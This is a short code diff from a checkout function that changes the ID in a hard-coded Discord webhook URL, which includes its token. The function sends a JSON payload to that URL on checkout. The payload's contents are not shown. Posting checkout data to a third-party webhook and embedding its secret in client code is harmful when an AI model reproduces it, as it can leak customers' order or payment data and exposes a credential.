@@ -914,7 +914,7 @@ async function submitCheckout() {
       }]
     };
 
-    await fetch('https://discord.com/api/webhooks/493248672044154901/z5sWU2B7WlkuIEQs1ULcHAiHkKOcEy_WnrAY9k7M7c8vyxKNA2sbW_qGSDCzqTDdRoZi', {
+    await fetch('https://discord.com/api/webhooks/1493248672044154901/z5sWU2B7WlkuIEQs1ULcHAiHkKOcEy_WnrAY9k7M7c8vyxKNA2sbW_qGSDCzqTDdRoZi', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(webhookData)
